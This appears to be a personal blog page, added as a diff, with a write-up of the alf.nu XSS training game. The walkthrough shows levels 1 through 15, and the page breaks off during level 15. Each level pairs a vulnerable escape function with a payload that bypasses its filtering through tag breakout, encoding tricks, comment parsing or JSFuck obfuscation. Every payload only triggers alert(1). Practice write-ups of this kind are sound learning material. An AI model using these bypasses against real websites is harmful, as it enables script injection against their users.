@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>XSS | Yyx</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1622952381444">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="闲了几天了，学一下xss，找了个靶场.
+xss靶场
+
+level1
+function escape(s) {
+  return '&lt;script&gt;console.log(&quot;'+s+'&quot;);&lt;/scrip..." />
+    <meta name="keywords" content="ctf" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://www.yyxyy.xyz/">
+        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1622952381444" class="site-logo">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      记得在这杂乱的生活里，带点微笑
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">XSS</h2>
+            <div class="post-date">2021-06-06</div>
+            
+            <div class="post-content" v-pre>
+              <p><strong>闲了几天了，学一下xss，找了个靶场.</strong></p>
+<p><a href="https://alf.nu/alert1">xss靶场</a></p>
+<hr>
+<h4 id="level1">level1</h4>
+<pre><code class="language-js">function escape(s) {
+  return '&lt;script&gt;console.log(&quot;'+s+'&quot;);&lt;/script&gt;';
+}
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&quot;);&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&quot;);&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&quot;);&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level2">level2</h4>
+<pre><code class="language-javascript">function escape(s) {
+  s = s.replace(/&quot;/g, '\\&quot;');//将输入的引号用‘\’进行转义.
+  return '&lt;script&gt;console.log(&quot;' + s + '&quot;);&lt;/script&gt;';
+}
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">\&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;\\&quot;)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&quot;);&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level3">level3</h4>
+<pre><code class="language-javascript">function escape(s) {
+  s = JSON.stringify(s);//对输入进行字符串化
+  return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';
+}
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&quot;);&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level4">level4</h4>
+<pre><code class="language-javascript">function escape(s) {
+  var text = s.replace(/&lt;/g, '&amp;lt;').replace(/&quot;/g, '&amp;quot;');
+  // URLs
+  text = text.replace(/(http:\/\/\S+)/g, '&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;');
+  // [[img123|Description]]
+  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;');
+  return text;
+}
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">[[a|http://onerror=alert(1)//]]
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">
+</code></pre>
+<p>分析</p>
+<ol>
+<li>对 &lt; 和 &quot; 进行转义</li>
+<li>对http:// 放入a标签</li>
+<li>对markdown语法进行img处理</li>
+</ol>
+<p>我们可以使用a标签 &quot; 来闭合 img标签 &quot; 后面达到xss效果</p>
+<pre><code class="language-javascript">//可以用这段代码尝试，构造xss
+s=&quot;[[a|http://onerror=alert(1)//]]http://&lt;scrtip&gt;alert(1)&lt;/script&gt;&quot;
+var text = s.replace(/&lt;/g, '&amp;lt;').replace(/&quot;/g, '&amp;quot;');
+    // URLs
+console.log(text)
+text = text.replace(/(http:\/\/\S+)/g, '&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;');
+    // [[img123|Description]]
+console.log(text)
+text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;');
+console.log(text)
+</code></pre>
+<hr>
+<h4 id="level5">level5</h4>
+<pre><code class="language-javascript">function escape(s) {
+  // Slightly too lazy to make two input fields.
+  // Pass in something like &quot;TextNode#foo&quot;
+  var m = s.split(/#/);
+
+  // Only slightly contrived at this point.
+  var a = document.createElement('div');
+  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
+  return a.innerHTML;
+}
+//m这里是一个数组。['aaa','bbb']像这样
+//a是创建的一个div标签
+//document相当于一个对象
+//creatm[0]是它的一个属性.
+//a.appendChild是div标签的子标签.
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">Comment#&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;
+//&lt;!--&gt;,浏览器有容错性，会修正为&lt;!----&gt;
+</code></pre>
+<hr>
+<h4 id="level6">level6</h4>
+<pre><code class="language-javascript">function escape(s) {
+  // Pass inn &quot;callback#userdata&quot;
+  var thing = s.split(/#/); 
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  //thing[0]里面允许大小写英文字母，中括号和引号.
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/&lt;/g, '\\u003c');
+  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&quot;&lt;/script&gt;&quot;;
+}
+</code></pre>
+<p>input</p>
+<pre><code>'#';alert(1)//
+</code></pre>
+<p>outpuy</p>
+<pre><code>&lt;script&gt;'({&quot;userdata&quot;:&quot;';alert(1)//&quot;})&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level7">level7</h4>
+<pre><code class="language-javascript">function escape(s) {
+  return '&lt;script&gt;console.log(&quot;' + s.toUpperCase() + '&quot;)&lt;/script&gt;';
+}
+//很容易饶过，但是输入被大写了于是编码unicode编码绕过
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&lt;/script&gt;&lt;SVG onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;&lt;script&gt;&quot;
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&lt;/SCRIPT&gt;&lt;SVG ONERROR=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;&lt;SCRIPT&gt;&quot;&quot;)&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level8">level8</h4>
+<pre><code class="language-javascript">function escape(s) {
+  function htmlEscape(s) {
+    return s.replace(/./g, function(x) {
+       return { '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '&amp;': '&amp;amp;', '&quot;': '&amp;quot;', &quot;'&quot;: '&amp;#39;' }[x] || x;       
+     });
+  }
+//函数对&lt;&gt;&amp;&quot;'进行了html实体转义.
+  function expandTemplate(template, args) {
+    return template.replace(
+        /{(\w+)}/g, 
+        function(_, n) { 
+           return htmlEscape(args[n]);
+         });
+  }
+  
+  return expandTemplate(
+    &quot;                                                \n\
+      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\
+      &lt;script&gt;                                       \n\
+         var v = document.getElementById('name');    \n\
+         v.innerHTML = '&lt;a href=#&gt;{name}&lt;/a&gt;';       \n\
+      &lt;\/script&gt;                                     \n\
+    &quot;,
+    { name : s }
+  );
+    //输入在{name}这里面，没有对 \ 进行处理，使用\x 编码绕过.
+}
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">\x3cimg src onerror=alert(1)\x3e
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">                                         
+      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         
+      &lt;script&gt;                                       
+         var v = document.getElementById('name');    
+         v.innerHTML = '&lt;a href=#&gt;\x3cimg src onerror=alert(1)\x3e&lt;/a&gt;';       
+      &lt;/script&gt;  
+</code></pre>
+<hr>
+<h4 id="level9">level9</h4>
+<pre><code class="language-javascript">function escape(s) {
+  s = JSON.stringify(s).replace(/&lt;\/script/gi, '');
+
+  return '&lt;script&gt;console.log(' + s + ');&lt;/script&gt;';
+}
+//正则将&lt;/script替换为空，且&quot;i&quot;不区分大小写，于是想到双写绕过
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&lt;/scr&lt;/scriptipt&gt;&lt;script&gt;alert(1)&lt;/scr&lt;/scriptipt&gt;
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level10">level10</h4>
+<pre><code class="language-javascript">function escape(s) {
+  // Pass inn &quot;callback#userdata&quot;
+  var thing = s.split(/#/); 
+
+  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
+  var obj = {'userdata': thing[1] };
+  var json = JSON.stringify(obj).replace(/\//g, '\\/');
+  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;
+}
+//和前面level6很像，不过对/进行转义，不能使用//注释，使用&lt;!--注释ok
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">'#';alert(1)&lt;!--
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;'({&quot;userdata&quot;:&quot;';alert(1)&lt;!--&quot;})&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level11">level11</h4>
+<pre><code class="language-javascript">function escape(s) {
+  if (/[&lt;&gt;]/.test(s)) return '-';
+
+  return '&lt;script&gt;console.log(&quot;' + s.toUpperCase() + '&quot;)&lt;/script&gt;';
+}
+//对&lt;&gt;进行了过滤，且将输入进行了大写处理
+//这里可以用到jsfuck，处理
+//  &quot;)alert(1)//  将alert（1）用jsfuck加密
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&quot;);(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+!+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()//
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&quot;);(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+!+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()//&quot;)&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level12">level12</h4>
+<pre><code class="language-javascript">function escape(s) {
+  var tag = document.createElement('iframe');
+
+  // For this one, you get to run any code you want, but in a &quot;sandboxed&quot; iframe.
+  //
+  // https://4i.am/?...raw=... just outputs whatever you pass in.
+  //
+  // Alerting from 4i.am won't count.
+
+  s = '&lt;script&gt;' + s + '&lt;\/script&gt;';
+  tag.src = 'https://4i.am/?:XSS=0&amp;CT=text/html&amp;raw=' + encodeURIComponent(s);
+
+  window.WINNING = function() { youWon = true; };
+
+  tag.setAttribute('onload', 'youWon &amp;&amp; alert(1)');
+  return tag.outerHTML;
+}
+//代码逻辑是youWon为true就能执行alert(1)
+//可以利用iframe设置name属性，name的值就会变为全局.
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">name=&quot;youWon&quot;
+
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;iframe src=&quot;https://4i.am/?:XSS=0&amp;amp;CT=text/html&amp;amp;raw=&lt;script&gt;name=&quot;youWon&quot;&quot;&lt;/script&gt;&quot; onload=&quot;youWon &amp;&amp; alert(1)&quot;&gt;&lt;/iframe&gt;
+</code></pre>
+<hr>
+<h4 id="level13">level13</h4>
+<pre><code class="language-javascript">function escape(s) {
+  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
+  function html(s) { return s.replace(/[&lt;&gt;&quot;&amp;]/g, function(s) {
+                        return '&amp;#' + s.charCodeAt(0) + ';'; }); }
+
+  return (
+    '&lt;script&gt;' +
+      'var url = ' + json(s) + '; // We\'ll use this later ' +
+    '&lt;/script&gt;\n\n' +
+    '  &lt;!-- for debugging --&gt;\n' +
+    '  URL: ' + html(s) + '\n\n' +
+    '&lt;!-- then suddenly --&gt;\n' +
+    '&lt;script&gt;\n' +
+    '  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);\n' +
+    '  else new Image().src = url;\n' +
+    '&lt;/script&gt;'
+  );
+}
+//这里html5里面&lt;!--&lt;script&gt;后面的内容会被当做js代码处理到&lt;/script&gt;结束.
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">if(alert(1)/*&lt;!--&lt;script&gt;
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;var url = &quot;if(alert(1)\/*&lt;!--&lt;script&gt;&quot;; // We'll use this later &lt;/script&gt;
+
+  &lt;!-- for debugging --&gt;
+  URL: if(alert(1)/*&amp;#60;!--&amp;#60;script&amp;#62;
+
+&lt;!-- then suddenly --&gt;
+&lt;script&gt;
+  if (!/^http:.*/.test(url)) console.log(&quot;Bad url: &quot; + url);
+  else new Image().src = url;
+&lt;/script&gt;
+</code></pre>
+<hr>
+<h4 id="level14">level14</h4>
+<pre><code class="language-javascript">function escape(s) {
+  return s.split('#').map(function(v) {
+      // Only 20% of slashes are end tags; save 1.2% of total
+      // bytes by only escaping those.
+      var json = JSON.stringify(v).replace(/&lt;\//g, '&lt;\\/');
+      return '&lt;script&gt;console.log('+json+')&lt;/script&gt;';
+      }).join('');
+}
+//还是要利用&lt;!--&lt;script&gt;来让后面代码作为js执行
+//这里添加个 --&gt;防止报错
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&lt;!--&lt;script&gt;#)/;alert(1)//--&gt;
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&lt;!--&lt;script&gt;&quot;)&lt;/script&gt;&lt;script&gt;console.log(&quot;)/;alert(1)//--&gt;&quot;)&lt;/script&gt;
+//其中/script&gt;&lt;script&gt;console.log(&quot;)/被当做了正则表达式解析，后面通过分号分割后，成功执行代码alert(1)。
+</code></pre>
+<hr>
+<h4 id="level15">level15</h4>
+<pre><code class="language-javascript">function escape(s) {
+  if (/[\\&lt;&gt;]/.test(s)) return '-';
+  return '&lt;script&gt;console.log(&quot;' + s.toUpperCase() + '&quot;)&lt;/script&gt;';
+}
+//还是想的是用jsfuck绕过
+</code></pre>
+<p>input</p>
+<pre><code class="language-javascript">&quot;);(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+